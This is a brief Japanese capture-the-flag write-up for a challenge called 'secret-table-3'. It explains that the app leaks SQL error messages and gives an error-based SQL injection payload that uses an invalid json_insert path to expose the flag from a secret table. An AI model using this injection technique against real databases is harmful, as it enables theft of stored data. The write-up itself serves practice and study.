---
title: secret-table-3 Writeup
date: 2026-07-10
---

ソースコードを見るとエラー内容が表示されるようになっている。
```
    if error:
        return f"SQL error: {error}"
```

エラーメッセージにフラグが含まれるように、SQL文を生成する。   
試行錯誤したところ、json系関数のPATHを不正にすることでエラーメッセージにその内容が表示できることが分かった。

以下をパスワードとして送信してフラグを取得した。
```
' or json_insert('{}', concat('$', (select flag from secret)), 1) ; -- 
```
